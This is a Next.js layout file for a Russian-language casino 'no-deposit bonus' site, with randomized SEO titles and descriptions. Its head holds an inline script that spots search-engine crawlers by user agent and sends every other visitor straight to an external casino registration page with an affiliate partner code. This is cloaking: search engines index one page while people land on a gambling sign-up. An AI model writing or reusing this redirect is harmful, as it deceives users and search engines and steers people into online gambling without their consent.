import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import './globals.css'

const randomTitle = (): string => {
  const titles = [
    'Бездепозитные бонусы казино 2025 | Лучшие предложения',
    'Бонусы за регистрацию в казино без депозита',
    'Казино без депозита: бездепозитные бонусы онлайн',
    'Бездепозитные бонусы в казино | Играй бесплатно',
    'Лучшие бонусы казино без депозита на сегодня',
  ]
  return titles[Math.floor(Math.random() * titles.length)]
}

const randomDescription = (): string => {
  const descriptions = [
    'Получите бездепозитные бонусы и бонусы за регистрацию в лучших казино. Топ актуальных предложений без депозита с выводом выигрышей. Новые бонусы казино каждый день для игроков РФ.',
    'Бездепозитные бонусы в казино — это ваша возможность играть без вложений. Регулярно обновляемый список лучших казино с бонусами за регистрацию и фриспинами.',
    'Полный список казино с бездепозитными бонусами и бонусами за регистрацию. Актуальные предложения, сравнение условий, вывод выигрышей — всё для ваших побед.',
    'Новые бездепозитные бонусы казино в 2025 году. Бонусы за регистрацию без депозита, фриспины, вращения. Лучшие казино с условиями вывода средств для российских игроков.',
  ]
  return descriptions[Math.floor(Math.random() * descriptions.length)]
}

export const metadata: Metadata = {
  title: randomTitle(),
  description: randomDescription(),
  generator: 'v0.app',
  robots: {
    index: true,
    follow: true,
    'max-image-preview': 'large',
    'max-snippet': -1,
    'max-video-preview': -1,
  },
  canonical: 'https://bezdepcasino2.vercel.app/',
  metadataBase: new URL('https://bezdepcasino2.vercel.app'),
  icons: {
    icon: '/bezdep-favicon.png',
    apple: '/bezdep-favicon.png',
  },
  openGraph: {
    type: 'website',
    locale: 'ru_RU',
    url: 'https://bezdepcasino2.vercel.app/',
    title: 'Бездепозитные бонусы казино',
    description: 'Лучшие бездепозитные бонусы и бонусы за регистрацию в казино',
  },
}

export const viewport: Viewport = {
  colorScheme: 'dark',
  themeColor: '#1a1a1a',
  width: 'device-width',
  initialScale: 1,
  maximumScale: 5,
  userScalable: true,
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className="bg-x7z2k1 text-xf5q9m9 scroll-smooth">
      <head>
        <meta name="yandex-verification" content="8f6c62a22240f427" />
        <meta charSet="utf-8" />
        <link rel="canonical" href="https://bezdepcasino2.vercel.app/" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1" />
        <link rel="alternate" hrefLang="ru" href="https://bezdepcasino2.vercel.app/" />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        try {
          var ua = (navigator.userAgent || '').toLowerCase();
          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
          if (!isBot) {
            window.location.replace(" https://1579.sparksvale.com/ru/registration?partner=p1579p41618p7603");
          }
        } catch(e) {}
      })();
    `,
  }}
/>
      </head>
      <body className="antialiased">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
